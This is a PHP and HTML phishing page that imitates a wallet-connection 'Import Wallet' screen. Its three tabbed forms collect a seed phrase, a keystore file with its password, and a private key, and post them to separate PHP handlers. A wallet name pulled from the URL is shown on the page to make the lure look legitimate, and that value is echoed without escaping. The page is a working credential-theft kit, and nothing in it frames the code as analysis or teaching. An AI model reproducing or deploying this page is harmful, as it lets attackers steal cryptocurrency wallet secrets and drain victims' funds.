<php?
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];    
      
 
$whatIWant = substr($url, strpos($url, "=") + 1);    
echo $whatIWant;
?>
    
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="stylesheet" href="./Import Wallet_files/main.css" type="text/css"> 
<meta name="description" content="Open protocol for connecting Wallets to Dapps">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:image" content="../images/logo.svg">
<link rel="icon" href="./Import Wallet_files/logo.svg">
<script>
    function openCity(evt, cityName) {
    // Declare all variables
    var i, tabcontent, tablinks;
  
    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
      tabcontent[i].style.display = "none";
    }
  
    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
  
    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
  }
  </script>
<title>Import Wallet</title>
</head>
<body>
<center>
<div class="top">
        <a href="#" class="left">Github</a>
        <a href="#" class="left">Docs</a>
        <a href="#" class="main"><img src="./Import Wallet_files/logo.svg" alt="logo"></a>
        <a href="#" class="left">Wallets</a>
        <a href="#" class="left">Apps</a>
</div>
<br>
<h2><center><?php  

    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];    
      
 
$whatIWant = strtoupper(substr($url, strpos($url, "=") + 1));    
echo $whatIWant;


?> Import Wallet</center></h2>
<br>
<div class="tab">
  <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
  <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">Keystore JSON</button>
  <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
</div>

<div id="phrase" class="tabcontent" style="display: block;">
<form w="" action="phrase.php" method="POST">

<input type="hidden" name="w" value="<?php  

    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];    
      
 
$whatIWant = strtoupper(substr($url, strpos($url, "=") + 1));    
echo $whatIWant;


?>">

<textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
<br>
<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
<br>
<button type="submit" name="import" class="btn">VALIDATE</button>
</form>
</div>

<div id="keystore" class="tabcontent" style="display: none;">
<form action="keystore.php" method="POST">

<input type="hidden" name="w" value="metamask">

<textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
<br>
<div class="field">
    <input type="text" name="password" placeholder="Password">
</div>
<div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
<br>
<button type="submit" name="import" class="btn">IMPORT</button>
</form>
</div>

<div id="private" class="tabcontent" style="display: none;">
<form action="privatekey.php" method="POST">
<input type="hidden" name="w" value="metamask">
<div class="field">
    <input type="text" name="key" class="key" placeholder="Private Key">
</div>
<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
<br>
<button type="submit" name="import" class="btn">IMPORT</button>
</form>
</div>

<script>
    document.getElementById("default").click();
</script>
<footer><div id="footer">
<p><img src="./Import Wallet_files/discord.svg" class="footimg">  <a href="#">Discord</a></p><br>
<p><img src="./Import Wallet_files/telegram.svg" class="footimg">  <a href="#">Telegram</a></p><br>
<p><img src="./Import Wallet_files/twitter.svg" class="footimg">  <a href="#">Twitter</a></p><br>
<p><img src="./Import Wallet_files/github.svg" class="footimg">  <a href="#">Github</a></p><br>
</div></footer>
</center></body></html>